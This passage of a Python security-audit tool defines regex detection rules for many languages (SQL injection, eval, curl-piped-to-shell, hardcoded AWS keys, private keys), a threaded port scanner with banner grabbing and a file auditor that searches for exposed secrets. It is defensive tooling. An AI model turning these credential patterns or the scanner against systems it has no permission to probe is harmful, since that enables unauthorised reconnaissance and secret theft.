    {"id": "RS-004", "name": "Raw Pointer Dereference", "pattern": r"\*(?:const|mut)\s+\w+|\.as_ptr\(\)|\.as_mut_ptr\(\)", "severity": SEVERITY_MEDIUM, "cwe": "CWE-119", "description": "Raw pointer manipulation. Must be in unsafe block with valid guarantees.", "recommendation": "Prefer references and slices over raw pointers."},
]

GO_PATTERNS = [
    {"id": "GO-001", "name": "Ignored Error", "pattern": r"\b\w+\s*,\s*_\s*:?=\s*\w+\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-252", "description": "Error return explicitly discarded.", "recommendation": "Always handle errors."},
    {"id": "GO-002", "name": "SQL Injection", "pattern": r'(?:Query|QueryRow|Exec)\s*\(\s*(?:"[^"]*"\s*\+|fmt\.Sprintf)', "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "description": "String concatenation in SQL. Injection risk.", "recommendation": "Use parameterized queries with $1, $2."},
    {"id": "GO-003", "name": "Goroutine Leak", "pattern": r"\bgo\s+func\s*\(", "severity": SEVERITY_MEDIUM, "cwe": "CWE-404", "description": "Anonymous goroutine. If it blocks forever, it leaks.", "recommendation": "Use context.WithCancel or channels for goroutine lifecycle."},
    {"id": "GO-004", "name": "Unsafe Package", "pattern": r'"unsafe"', "severity": SEVERITY_MEDIUM, "cwe": "CWE-119", "description": "unsafe package bypasses Go's type safety.", "recommendation": "Avoid unsafe unless absolutely necessary."},
]

CSS_PATTERNS = [
    {"id": "CSS-001", "name": "CSS Expression (IE)", "pattern": r"expression\s*\(", "severity": SEVERITY_HIGH, "cwe": "CWE-79", "description": "CSS expression() executes JavaScript. XSS vector in older IE.", "recommendation": "Remove all CSS expressions."},
    {"id": "CSS-002", "name": "External Resource Loading", "pattern": r"url\s*\(\s*['\"]?https?://", "severity": SEVERITY_LOW, "cwe": "CWE-829", "description": "External resource loaded via CSS. Privacy/tracking concern.", "recommendation": "Host resources locally when possible."},
    {"id": "CSS-003", "name": "@import from External Source", "pattern": r"@import\s+(?:url\()?['\"]?https?://", "severity": SEVERITY_LOW, "cwe": "CWE-829", "description": "External stylesheet imported. Supply chain risk.", "recommendation": "Host stylesheets locally. Use subresource integrity."},
]

HTML_PATTERNS = [
    {"id": "HTML-001", "name": "Inline JavaScript Event Handler", "pattern": r"\bon\w+\s*=\s*['\"]", "severity": SEVERITY_MEDIUM, "cwe": "CWE-79", "description": "Inline event handlers bypass CSP and make XSS harder to prevent.", "recommendation": "Use addEventListener() in external scripts."},
    {"id": "HTML-002", "name": "Missing CSP Meta Tag", "pattern": r"<head>(?!.*Content-Security-Policy)", "severity": SEVERITY_LOW, "cwe": "CWE-693", "description": "No Content-Security-Policy found. XSS protection reduced.", "recommendation": "Add CSP via meta tag or HTTP header."},
    {"id": "HTML-003", "name": "Insecure iframe", "pattern": r"<iframe(?!.*sandbox)", "severity": SEVERITY_MEDIUM, "cwe": "CWE-1021", "description": "iframe without sandbox attribute. Can execute scripts and navigate.", "recommendation": "Add sandbox attribute to iframes."},
    {"id": "HTML-004", "name": "External Script Without Integrity", "pattern": r'<script\s+[^>]*src=[\'"]https?://(?![^>]*integrity)', "severity": SEVERITY_MEDIUM, "cwe": "CWE-829", "description": "External script loaded without subresource integrity check.", "recommendation": "Add integrity and crossorigin attributes."},
    {"id": "HTML-005", "name": "Form Action to External URL", "pattern": r'<form[^>]*action=[\'"]https?://', "severity": SEVERITY_MEDIUM, "cwe": "CWE-352", "description": "Form submits data to an external URL.", "recommendation": "Verify the destination and add CSRF protection."},
    {"id": "HTML-006", "name": "Password Field Without Autocomplete Off", "pattern": r'<input[^>]*type=[\'"]password[\'"](?!.*autocomplete=[\'"](?:off|new-password))', "severity": SEVERITY_LOW, "cwe": "CWE-522", "description": "Password field may be cached by browser.", "recommendation": "Add autocomplete='new-password' or autocomplete='off'."},
]

SHELL_PATTERNS = [
    {"id": "SH-001", "name": "Unquoted Variable Expansion", "pattern": r"\$\w+(?!\s*[\"'])", "severity": SEVERITY_MEDIUM, "cwe": "CWE-78", "description": "Unquoted variable — word splitting and globbing. Injection if from user.", "recommendation": 'Always quote variables: "$VAR" instead of $VAR.'},
    {"id": "SH-002", "name": "eval in Shell Script", "pattern": r"\beval\s+", "severity": SEVERITY_HIGH, "cwe": "CWE-95", "description": "eval in shell executes arbitrary commands. Injection risk.", "recommendation": "Avoid eval. Use arrays or direct execution."},
    {"id": "SH-003", "name": "curl Piped to Shell", "pattern": r"curl\s+.*\|\s*(?:bash|sh|zsh)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-829", "description": "Downloading and executing code in one step. Supply chain attack.", "recommendation": "Download first, verify checksum, then execute."},
    {"id": "SH-004", "name": "World-Writable Permissions", "pattern": r"chmod\s+(?:777|666|o\+w)", "severity": SEVERITY_HIGH, "cwe": "CWE-732", "description": "File made world-writable. Any user on system can modify.", "recommendation": "Use least-privilege permissions (e.g., 755, 644)."},
]

PHP_PATTERNS = [
    {"id": "PHP-001", "name": "SQL Injection", "pattern": r'(?:mysql_query|mysqli_query|->query)\s*\(\s*(?:"\s*\.|\'.*\$|\$)', "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "description": "SQL query with variable interpolation. Database compromise.", "recommendation": "Use prepared statements with PDO or mysqli."},
    {"id": "PHP-002", "name": "eval/system Injection", "pattern": r"\b(?:eval|system|exec|passthru|shell_exec|popen|proc_open)\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-78", "description": "Code/command execution function. Full compromise if user input reaches it.", "recommendation": "Avoid. If required, use escapeshellarg() and whitelist."},
    {"id": "PHP-003", "name": "File Inclusion", "pattern": r"\b(?:include|require|include_once|require_once)\s*\(\s*\$", "severity": SEVERITY_CRITICAL, "cwe": "CWE-98", "description": "Dynamic file inclusion with variable. Remote file inclusion possible.", "recommendation": "Use a whitelist of allowed files. Never include user-supplied paths."},
    {"id": "PHP-004", "name": "Unsafe Deserialization", "pattern": r"\bunserialize\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-502", "description": "PHP unserialize() on user data enables object injection and RCE.", "recommendation": "Use json_decode() instead."},
]

RUBY_PATTERNS = [
    {"id": "RB-001", "name": "eval — Code Injection", "pattern": r"\b(?:eval|instance_eval|class_eval|module_eval|send)\s*[\(]", "severity": SEVERITY_CRITICAL, "cwe": "CWE-95", "description": "Dynamic code execution. RCE if user input reaches it.", "recommendation": "Avoid eval. Use safe alternatives."},
    {"id": "RB-002", "name": "System Command Execution", "pattern": r"\b(?:system|exec|`|%x\{|Open3|IO\.popen)\s*[\(\{]?", "severity": SEVERITY_HIGH, "cwe": "CWE-78", "description": "OS command execution. Command injection risk.", "recommendation": "Use array form of system() for safe argument passing."},
    {"id": "RB-003", "name": "Mass Assignment", "pattern": r"\bparams\.permit!\b|attr_accessible", "severity": SEVERITY_HIGH, "cwe": "CWE-915", "description": "Mass assignment allows overwriting any attribute including admin flags.", "recommendation": "Use strong parameters with explicit permit()."},
]

JAVA_PATTERNS = [
    {"id": "JV-001", "name": "SQL Injection", "pattern": r'(?:createStatement|executeQuery|executeUpdate)\s*\(\s*(?:".*\+|String\.format)', "severity": SEVERITY_CRITICAL, "cwe": "CWE-89", "description": "SQL query built with string concatenation.", "recommendation": "Use PreparedStatement with parameterized queries."},
    {"id": "JV-002", "name": "Unsafe Deserialization", "pattern": r"\bObjectInputStream\s*\(", "severity": SEVERITY_CRITICAL, "cwe": "CWE-502", "description": "Java deserialization of untrusted data. RCE via gadget chains.", "recommendation": "Use JSON/XML. If required, use deserialization filters (JEP 290)."},
    {"id": "JV-003", "name": "Hardcoded Credentials", "pattern": r'(?:password|secret|apiKey|token)\s*=\s*"[^"]{4,}"', "severity": SEVERITY_CRITICAL, "cwe": "CWE-798", "description": "Hardcoded secret in source.", "recommendation": "Use environment variables or secure configuration."},
    {"id": "JV-004", "name": "Weak Crypto Algorithm", "pattern": r'(?:getInstance\s*\(\s*"(?:MD5|SHA-1|DES|RC4|RC2)"|Cipher\.getInstance\s*\(\s*"(?:DES|AES/ECB))', "severity": SEVERITY_HIGH, "cwe": "CWE-327", "description": "Weak or broken cryptographic algorithm.", "recommendation": "Use AES-256-GCM, SHA-256+. Never DES/MD5/SHA-1/ECB."},
    {"id": "JV-005", "name": "XXE — XML External Entity", "pattern": r"\bDocumentBuilderFactory\.newInstance\(\)(?!.*setFeature.*disallow-doctype)", "severity": SEVERITY_HIGH, "cwe": "CWE-611", "description": "XML parser without XXE protection.", "recommendation": "Disable external entities and DTDs in parser factory."},
]

SQL_PATTERNS = [
    {"id": "SQL-001", "name": "GRANT ALL PRIVILEGES", "pattern": r"\bGRANT\s+ALL\b", "severity": SEVERITY_HIGH, "cwe": "CWE-250", "description": "Granting all privileges. Violates least privilege.", "recommendation": "Grant only specific required privileges."},
    {"id": "SQL-002", "name": "DROP TABLE Without IF EXISTS", "pattern": r"\bDROP\s+TABLE\s+(?!IF\s+EXISTS)", "severity": SEVERITY_MEDIUM, "cwe": "CWE-20", "description": "DROP TABLE without safety check. Error if table doesn't exist.", "recommendation": "Use DROP TABLE IF EXISTS."},
    {"id": "SQL-003", "name": "Plaintext Password Storage", "pattern": r"(?:password|passwd)\s+(?:VARCHAR|TEXT|CHAR)", "severity": SEVERITY_CRITICAL, "cwe": "CWE-256", "description": "Password column appears to store plaintext.", "recommendation": "Store hashed passwords only (bcrypt, argon2)."},
]

YAML_PATTERNS = [
    {"id": "YML-001", "name": "Secrets in YAML Config", "pattern": r'(?:password|secret|api_key|token|private_key)\s*:\s*\S{4,}', "severity": SEVERITY_HIGH, "cwe": "CWE-798", "description": "Secret value in YAML configuration file.", "recommendation": "Use environment variable references or secret management."},
    {"id": "YML-002", "name": "Privileged Container", "pattern": r"privileged\s*:\s*true", "severity": SEVERITY_CRITICAL, "cwe": "CWE-250", "description": "Container running in privileged mode. Full host access.", "recommendation": "Remove privileged mode. Use specific capabilities instead."},
]

DOCKERFILE_PATTERNS = [
    {"id": "DKR-001", "name": "Running as Root", "pattern": r"^(?!.*USER\s+\w).*(?:CMD|ENTRYPOINT)", "severity": SEVERITY_MEDIUM, "cwe": "CWE-250", "description": "Container runs as root by default.", "recommendation": "Add USER directive with non-root user."},
    {"id": "DKR-002", "name": "Latest Tag", "pattern": r"FROM\s+\w+:latest|FROM\s+\w+\s*$", "severity": SEVERITY_LOW, "cwe": "CWE-829", "description": "Using 'latest' tag. Builds are not reproducible.", "recommendation": "Pin to specific version tags."},
    {"id": "DKR-003", "name": "Secrets in ENV", "pattern": r"ENV\s+(?:\w*(?:PASSWORD|SECRET|KEY|TOKEN)\w*)\s*=", "severity": SEVERITY_HIGH, "cwe": "CWE-798", "description": "Secret in Dockerfile ENV. Visible in image layers.", "recommendation": "Use build secrets or runtime environment variables."},
]

UNIVERSAL_PATTERNS = [
    {"id": "UNI-001", "name": "IP Address Hardcoded", "pattern": r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b", "severity": SEVERITY_LOW, "cwe": "CWE-200", "description": "Internal/private IP address hardcoded. Information disclosure.", "recommendation": "Use configuration or DNS names."},
    {"id": "UNI-002", "name": "Email Address in Source", "pattern": r"\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b", "severity": SEVERITY_INFO, "cwe": "CWE-200", "description": "Email address found in source code.", "recommendation": "Review if this should be in configuration instead."},
    {"id": "UNI-003", "name": "TODO/FIXME/HACK/BUG Note", "pattern": r"\b(TODO|FIXME|HACK|XXX|BUG|BROKEN|WORKAROUND)\b", "severity": SEVERITY_INFO, "cwe": "CWE-546", "description": "Developer note indicating incomplete or problematic code.", "recommendation": "Review and address."},
    {"id": "UNI-004", "name": "Base64-Encoded Secret Candidate", "pattern": r'["\'][A-Za-z0-9+/]{40,}={0,2}["\']', "severity": SEVERITY_MEDIUM, "cwe": "CWE-798", "description": "Long base64 string — possible encoded credential.", "recommendation": "Verify contents. Move secrets to secure storage."},
    {"id": "UNI-005", "name": "AWS Access Key Pattern", "pattern": r"\bAKIA[0-9A-Z]{16}\b", "severity": SEVERITY_CRITICAL, "cwe": "CWE-798", "description": "AWS Access Key ID pattern detected.", "recommendation": "Rotate immediately. Use IAM roles or AWS Secrets Manager."},
    {"id": "UNI-006", "name": "Private Key Block", "pattern": r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----", "severity": SEVERITY_CRITICAL, "cwe": "CWE-321", "description": "Private key embedded in source code.", "recommendation": "Remove and rotate. Store in secure vault."},
    {"id": "UNI-007", "name": "JWT Token Pattern", "pattern": r"\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b", "severity": SEVERITY_HIGH, "cwe": "CWE-798", "description": "JWT token found in source code.", "recommendation": "Remove. Generate tokens at runtime."},
]

ALL_PATTERNS = {
    "cpp": CPP_PATTERNS,
    "python": PYTHON_PATTERNS,
    "javascript": JS_TS_PATTERNS,
    "typescript": JS_TS_PATTERNS,
    "solidity": SOLIDITY_PATTERNS,
    "rust": RUST_PATTERNS,
    "go": GO_PATTERNS,
    "java": JAVA_PATTERNS,
    "csharp": JS_TS_PATTERNS,
    "php": PHP_PATTERNS,
    "ruby": RUBY_PATTERNS,
    "swift": [],
    "kotlin": JAVA_PATTERNS,
    "scala": JAVA_PATTERNS,
    "perl": [],
    "lua": [],
    "r": [],
    "shell": SHELL_PATTERNS,
    "powershell": SHELL_PATTERNS,
    "html": HTML_PATTERNS,
    "css": CSS_PATTERNS,
    "sql": SQL_PATTERNS,
    "yaml": YAML_PATTERNS,
    "xml": [],
    "json": [],
    "toml": [],
    "ini": YAML_PATTERNS,
    "dockerfile": DOCKERFILE_PATTERNS,
    "makefile": SHELL_PATTERNS,
    "cmake": SHELL_PATTERNS,
    "assembly": [],
    "objc": CPP_PATTERNS,
    "dart": JS_TS_PATTERNS,
    "elixir": [],
    "haskell": [],
    "zig": [],
    "nim": [],
    "v": [],
}


class Finding:
    def __init__(self, file_path, line_num, line_content, rule, context_before=None, context_after=None):
        self.file_path = str(file_path)
        self.line_num = line_num
        self.line_content = line_content.strip()
        self.rule = rule
        self.context_before = context_before or []
        self.context_after = context_after or []
        self.connections = []
        self.connection_reason = ""

    def to_dict(self):
        d = {
            "file": self.file_path,
            "line": self.line_num,
            "code": self.line_content[:500],
            "rule_id": self.rule["id"],
            "rule_name": self.rule["name"],
            "severity": self.rule["severity"],
            "cwe": self.rule.get("cwe", "N/A"),
            "description": self.rule["description"],
            "recommendation": self.rule["recommendation"],
            "context_before": self.context_before,
            "context_after": self.context_after,
        }
        if self.connections:
            d["connected_bugs"] = [
                {"rule_id": c.rule["id"], "file": c.file_path, "line": c.line_num, "reason": self.connection_reason}
                for c in self.connections
            ]
        return d


class WiringMap:
    def __init__(self):
        self.imports = defaultdict(set)
        self.imported_by = defaultdict(set)
        self.file_languages = {}

    def add_import(self, source_file, target):
        self.imports[source_file].add(target)
        self.imported_by[target].add(source_file)

    def to_dict(self):
        return {
            "imports": {k: sorted(v) for k, v in self.imports.items()},
            "imported_by": {k: sorted(v) for k, v in self.imported_by.items()},
            "file_languages": self.file_languages,
        }


class NetworkScanner:
    COMMON_PORTS = {
        20: "FTP-Data", 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP",
        53: "DNS", 67: "DHCP", 68: "DHCP", 69: "TFTP", 80: "HTTP",
        110: "POP3", 111: "RPC", 119: "NNTP", 123: "NTP", 135: "MSRPC",
        137: "NetBIOS", 138: "NetBIOS", 139: "NetBIOS", 143: "IMAP",
        161: "SNMP", 162: "SNMP-Trap", 179: "BGP", 389: "LDAP",
        443: "HTTPS", 445: "SMB", 465: "SMTPS", 514: "Syslog",
        515: "LPD", 520: "RIP", 587: "SMTP-Sub", 631: "IPP",
        636: "LDAPS", 993: "IMAPS", 995: "POP3S", 1080: "SOCKS",
        1433: "MSSQL", 1434: "MSSQL-Brow", 1521: "Oracle", 1723: "PPTP",
        2049: "NFS", 2082: "cPanel", 2083: "cPanel-SSL", 2181: "ZooKeeper",
        3000: "Dev-Server", 3306: "MySQL", 3389: "RDP", 3478: "STUN",
        4443: "Pharos", 5000: "Dev-Server", 5432: "PostgreSQL",
        5672: "AMQP", 5900: "VNC", 6379: "Redis", 6443: "K8s-API",
        7001: "WebLogic", 8000: "HTTP-Alt", 8080: "HTTP-Proxy",
        8443: "HTTPS-Alt", 8888: "HTTP-Alt", 9090: "Prometheus",
        9200: "Elasticsearch", 9300: "ES-Transport", 9418: "Git",
        11211: "Memcached", 15672: "RabbitMQ", 27017: "MongoDB",
        27018: "MongoDB", 28017: "MongoDB-Web", 50000: "SAP",
    }

    RISKY_PORTS = {
        23: "Telnet transmits plaintext credentials",
        21: "FTP transmits plaintext credentials",
        25: "SMTP relay may allow spam",
        69: "TFTP has no authentication",
        111: "RPC can expose system services",
        135: "MSRPC commonly exploited (EternalBlue family)",
        137: "NetBIOS leaks system info",
        139: "NetBIOS session — SMB v1 vulnerabilities",
        161: "SNMP v1/v2 uses community strings (plaintext)",
        445: "SMB — ransomware vector (WannaCry, NotPetya)",
        512: "rexec — no encryption",
        513: "rlogin — no encryption",
        514: "rsh/syslog — no authentication",
        1433: "MSSQL — common brute force target",
        1434: "MSSQL Browser — info disclosure",
        2049: "NFS — file system exposure",
        3306: "MySQL — common brute force target",
        3389: "RDP — brute force and BlueKeep (CVE-2019-0708)",
        5432: "PostgreSQL — common brute force target",
        5900: "VNC — often no auth or weak auth",
        6379: "Redis — frequently left unprotected",
        11211: "Memcached — amplification attacks",
        27017: "MongoDB — frequently left without auth",
    }

    def __init__(self, target="127.0.0.1", port_range=None, timeout=1.0):
        self.target = target
        self.port_range = port_range or list(self.COMMON_PORTS.keys()) + list(range(1, 1025))
        self.port_range = sorted(set(self.port_range))
        self.timeout = timeout
        self.results = []
        self.findings = []

    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                service = self.COMMON_PORTS.get(port, "Unknown")
                banner = ""
                try:
                    sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()[:200]
                except:
                    pass
                sock.close()
                return {"port": port, "state": "OPEN", "service": service, "banner": banner}
            sock.close()
        except socket.timeout:
            return None
        except Exception:
            return None
        return None

    def scan(self):
        print(f"\n  [NET] Scanning {self.target} ({len(self.port_range)} ports)...", end="", flush=True)
        open_ports = []
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(self.scan_port, p): p for p in self.port_range}
            done_count = 0
            for future in as_completed(futures):
                done_count += 1
                if done_count % 200 == 0:
                    print(".", end="", flush=True)
                result = future.result()
                if result:
                    open_ports.append(result)

        self.results = sorted(open_ports, key=lambda x: x["port"])
        print(f" found {len(self.results)} open ports")

        for port_info in self.results:
            p = port_info["port"]
            if p in self.RISKY_PORTS:
                self.findings.append(Finding(
                    f"network:{self.target}", p, f"Port {p} ({port_info['service']}) is OPEN",
                    {"id": f"NET-{p:05d}", "name": f"Risky Open Port: {port_info['service']}",
                     "severity": SEVERITY_HIGH if p in (23, 445, 3389, 6379, 27017, 139, 135) else SEVERITY_MEDIUM,
                     "cwe": "CWE-200",
                     "description": self.RISKY_PORTS[p],
                     "recommendation": f"Close port {p} or restrict access with firewall rules."}
                ))

        return self.results

    def get_system_info(self):
        info = {
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "python_version": platform.python_version(),
        }
        try:
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
        except:
            info["local_ip"] = "unknown"
        try:
            info["fqdn"] = socket.getfqdn()
        except:
            info["fqdn"] = "unknown"
        return info

    def get_network_interfaces(self):
        interfaces = []
        try:
            result = subprocess.run(
                ["ip", "addr"] if platform.system() == "Linux" else ["ifconfig"],
                capture_output=True, text=True, timeout=5
            )
            interfaces.append(result.stdout[:2000])
        except:
            try:
                result = subprocess.run(["ipconfig"] if platform.system() == "Windows" else ["ifconfig", "-a"],
                                        capture_output=True, text=True, timeout=5)
                interfaces.append(result.stdout[:2000])
            except:
                interfaces.append("Could not retrieve network interfaces")
        return interfaces

    def check_arp_table(self):
        try:
            result = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=5)
            return result.stdout[:2000]
        except:
            return "ARP table not available"

    def check_routing_table(self):
        try:
            cmd = ["route", "print"] if platform.system() == "Windows" else ["ip", "route"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            return result.stdout[:2000]
        except:
            try:
                result = subprocess.run(["netstat", "-rn"], capture_output=True, text=True, timeout=5)
                return result.stdout[:2000]
            except:
                return "Routing table not available"

    def check_listening_services(self):
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["netstat", "-ano"], capture_output=True, text=True, timeout=5)
            else:
                result = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True, timeout=5)
            return result.stdout[:3000]
        except:
            try:
                result = subprocess.run(["netstat", "-tlnp"], capture_output=True, text=True, timeout=5)
                return result.stdout[:3000]
            except:
                return "Listening services not available"


class SecurityAuditor:
    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.findings = []

    def audit(self):
        print("\n  [SEC] Running security audit...", flush=True)
        self._check_file_permissions()
        self._check_sensitive_files()
        self._check_git_exposure()
        self._check_env_files()
        self._check_ssh_keys()
        self._check_certificates()
        self._check_config_files()
        self._check_log_files()
        self._check_backup_files()
        self._check_package_security()
        print(f"  [SEC] Found {len(self.findings)} security issues")
        return self.findings

    def _add_finding(self, file_path, line, code, rule_id, name, severity, cwe, desc, rec):
        self.findings.append(Finding(
            str(file_path), line, code,
            {"id": rule_id, "name": name, "severity": severity, "cwe": cwe,
             "description": desc, "recommendation": rec}
        ))

    def _check_file_permissions(self):
        if platform.system() == "Windows":
            return
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                fpath = Path(root) / f
                try:
                    mode = oct(fpath.stat().st_mode)[-3:]
                    if mode in ("777", "776", "775", "766", "667"):
                        self._add_finding(
                            fpath.relative_to(self.target_path), 0, f"Permissions: {mode}",
                            "SEC-001", "World-Writable File", SEVERITY_HIGH, "CWE-732",
                            f"File has overly permissive permissions ({mode}).",
                            "chmod 644 for files, 755 for directories.")
                except (OSError, ValueError):
                    pass

    def _check_sensitive_files(self):
        sensitive = [
            ".env", ".env.local", ".env.production", ".env.staging",
            ".htpasswd", ".htaccess", "wp-config.php",
            "config.php", "settings.py", "secrets.yml", "credentials.json",
            "serviceAccountKey.json", "firebase-adminsdk.json",
        ]
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                if f.lower() in [s.lower() for s in sensitive]:
                    self._add_finding(
                        Path(root, f).relative_to(self.target_path), 0, f"Sensitive file: {f}",
                        "SEC-002", f"Sensitive File Exposed: {f}", SEVERITY_HIGH, "CWE-538",
                        f"Sensitive configuration file ({f}) found in project.",
                        "Ensure this file is in .gitignore and not deployed to production.")

    def _check_git_exposure(self):
        git_dir = self.target_path / ".git"
        if git_dir.exists():
            config = git_dir / "config"
            if config.exists():
                try:
                    content = config.read_text(errors="ignore")
                    if "url = " in content:
                        urls = re.findall(r"url\s*=\s*(.+)", content)
                        for url in urls:
                            if re.search(r"https?://[^@]+:[^@]+@", url):
                                self._add_finding(
                                    ".git/config", 0, f"Remote URL with credentials: {url[:50]}...",
                                    "SEC-003", "Git Remote with Embedded Credentials", SEVERITY_CRITICAL, "CWE-798",
                                    "Git remote URL contains plaintext credentials.",
                                    "Use SSH keys or credential helpers instead.")
                except:
                    pass

    def _check_env_files(self):
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                if f.startswith(".env"):
                    fpath = Path(root) / f
                    try:
                        content = fpath.read_text(errors="ignore")
                        for i, line in enumerate(content.split("\n"), 1):
                            if "=" in line and not line.strip().startswith("#"):
                                key = line.split("=")[0].strip().upper()
                                val = line.split("=", 1)[1].strip().strip("'\"")
                                if any(s in key for s in ["PASSWORD", "SECRET", "KEY", "TOKEN", "PRIVATE"]):
                                    if val and val != "" and not val.startswith("${"):
                                        self._add_finding(
                                            fpath.relative_to(self.target_path), i,
                                            f"{key}=***REDACTED***",
                                            "SEC-004", f"Secret in .env: {key}", SEVERITY_HIGH, "CWE-798",
                                            f"Secret '{key}' found in {f}.",
                                            "Use a secrets manager. Ensure .env is in .gitignore.")
                    except:
                        pass

    def _check_ssh_keys(self):
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                if f.startswith("id_") and not f.endswith(".pub"):
                    self._add_finding(
                        Path(root, f).relative_to(self.target_path), 0, f"SSH private key: {f}",
                        "SEC-005", "SSH Private Key in Repository", SEVERITY_CRITICAL, "CWE-321",
                        "SSH private key found in project directory.",
                        "Remove immediately. Rotate key. Add to .gitignore.")
                fpath = Path(root) / f
                if fpath.suffix in (".pem", ".key", ".p12", ".pfx"):
                    self._add_finding(
                        fpath.relative_to(self.target_path), 0, f"Private key file: {f}",
                        "SEC-006", f"Private Key/Certificate File: {f}", SEVERITY_HIGH, "CWE-321",
                        f"Private key or certificate file ({f}) found in project.",
                        "Move to secure storage. Add to .gitignore.")

    def _check_certificates(self):
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                fpath = Path(root) / f
                if fpath.suffix in (".crt", ".cer", ".der"):
                    self._add_finding(
                        fpath.relative_to(self.target_path), 0, f"Certificate file: {f}",
                        "SEC-007", f"Certificate in Repository: {f}", SEVERITY_LOW, "CWE-295",
                        "Certificate file in project. Verify it's not a CA root or contains private material.",
                        "Review certificate contents and purpose.")

    def _check_config_files(self):
        config_patterns = {
            "database.yml": r"password:\s*\S+",
            "database.json": r'"password"\s*:\s*"[^"]{4,}"',
            "appsettings.json": r'"ConnectionString"\s*:\s*"[^"]*[Pp]assword=[^"]*"',
        }
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                for config_name, pattern in config_patterns.items():
                    if f.lower() == config_name.lower():
                        fpath = Path(root) / f
                        try:
                            content = fpath.read_text(errors="ignore")
                            for i, line in enumerate(content.split("\n"), 1):
                                if re.search(pattern, line, re.IGNORECASE):
                                    self._add_finding(
                                        fpath.relative_to(self.target_path), i,
                                        re.sub(r'(password["\s:=]+)\S+', r'\1***REDACTED***', line.strip(), flags=re.IGNORECASE),
                                        "SEC-008", f"Credential in Config: {f}", SEVERITY_HIGH, "CWE-798",
                                        f"Credential found in configuration file {f}.",
                                        "Use environment variables or encrypted config.")
                        except:
                            pass

    def _check_log_files(self):
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                fpath = Path(root) / f
                if fpath.suffix == ".log" and fpath.stat().st_size > 0:
                    try:
                        content = fpath.read_text(errors="ignore")[:5000]
                        for i, line in enumerate(content.split("\n"), 1):
                            if re.search(r'(?:password|token|secret|api.?key)\s*[=:]\s*\S+', line, re.IGNORECASE):
                                self._add_finding(
                                    fpath.relative_to(self.target_path), i,
                                    "***SECRET IN LOG***",
                                    "SEC-009", "Secret Leaked in Log File", SEVERITY_HIGH, "CWE-532",
                                    "Sensitive data found in log file.",
                                    "Sanitize log output. Remove log files from repository.")
                                break
                    except:
                        pass

    def _check_backup_files(self):
        backup_exts = {".bak", ".backup", ".old", ".orig", ".save", ".swp", ".swo", ".tmp"}
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {".git", "node_modules", "__pycache__", "venv"}]
            for f in files:
                fpath = Path(root) / f
                if fpath.suffix.lower() in backup_exts:
                    self._add_finding(
                        fpath.relative_to(self.target_path), 0, f"Backup file: {f}",
                        "SEC-010", f"Backup File Exposed: {f}", SEVERITY_LOW, "CWE-538",
                        "Backup file in project. May contain sensitive data or old vulnerable code.",
                        "Remove backup files from the project.")

    def _check_package_security(self):
        pkg_files = {
            "package.json": self._audit_npm,
            "requirements.txt": self._audit_pip,
            "Gemfile.lock": self._audit_gems,
            "Cargo.lock": self._audit_cargo,
            "go.sum": self._audit_go,
        }
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in {"node_modules", "__pycache__", "venv", ".git"}]
            for f in files:
                if f in pkg_files:
                    pkg_files[f](Path(root) / f)
            break

    def _audit_npm(self, pkg_path):
        self._add_finding(
            pkg_path.relative_to(self.target_path), 0, "package.json found",
            "SEC-011", "NPM Dependency Audit Recommended", SEVERITY_INFO, "CWE-829",
            "Run 'npm audit' to check for known vulnerabilities in dependencies.",
            "Run: npm audit --production")

    def _audit_pip(self, req_path):
        self._add_finding(
            req_path.relative_to(self.target_path), 0, "requirements.txt found",
            "SEC-012", "Python Dependency Audit Recommended", SEVERITY_INFO, "CWE-829",
            "Run 'pip-audit' or 'safety check' to scan for known vulnerabilities.",
            "Install pip-audit: pip install pip-audit && pip-audit")

    def _audit_gems(self, gem_path):
        self._add_finding(
            gem_path.relative_to(self.target_path), 0, "Gemfile.lock found",
            "SEC-013", "Ruby Dependency Audit Recommended", SEVERITY_INFO, "CWE-829",
